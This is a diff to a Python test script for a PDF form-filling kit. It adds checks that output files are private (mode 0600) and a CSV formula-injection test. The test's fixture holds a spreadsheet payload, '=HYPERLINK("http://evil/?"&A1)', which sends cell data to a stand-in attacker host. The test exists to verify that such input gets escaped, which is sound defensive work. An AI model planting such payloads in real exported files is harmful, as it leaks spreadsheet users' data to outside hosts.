@@ -6,6 +6,7 @@ Usage: python tests/test_fill_script.py     (needs pypdf, pdfplumber, pypdfium2,
 import csv
 import json
 import shutil
+import stat
 import subprocess
 import sys
 import tempfile
@@ -73,6 +74,17 @@ def main():
     subprocess.run([sys.executable, str(SCRIPTS / "make_kit.py"), str(d / "work/template.json"), str(d / "t.pdf"),
                     str(d), "t"], check=True, capture_output=True)
     assert not (d / "PWNED").exists(), "form title ran as code"
+    assert stat.S_IMODE((d / "t-answers.csv").stat().st_mode) == 0o600, "answers.csv is readable by others"
+
+    injection = {"title": "Injection test", "fields": [
+        {"id": "f1", "page": 0, "kind": "text", "question": '=HYPERLINK("http://evil/?"&A1)',
+         "box": [72, 100, 300, 116]}]}
+    (d / "work" / "injection.json").write_text(json.dumps(injection))
+    subprocess.run([sys.executable, str(SCRIPTS / "make_kit.py"), str(d / "work/injection.json"), str(d / "t.pdf"),
+                    str(d), "inj"], check=True, capture_output=True)
+    row = next(csv.DictReader(open(d / "inj-answers.csv", newline="")))
+    assert row["Question"][0] not in "=+-@\t\r", "question cell still opens as a formula: " + row["Question"]
+    assert row["Question"] == "'" + injection["fields"][0]["question"], "question text was altered, not just escaped"
 
     sheet(d, zip="98101", ok="yes")
     code, out = run(d)
@@ -80,6 +92,7 @@ def main():
     v = values(d / "t-filled.pdf")
     assert v["name"] == "Avery Example" and v["dob"] == "02/03/2015" and v["zip"] == "98101", v
     assert "Avery" not in out and "98101" not in out, "an answer was printed"
+    assert stat.S_IMODE((d / "t-filled.pdf").stat().st_mode) == 0o600, "filled PDF is readable by others"
 
     code, out = run(d, "--child", "2")
     assert code == 0 and values(d / "t-child2-filled.pdf")["name"] == "Quinn Example", out
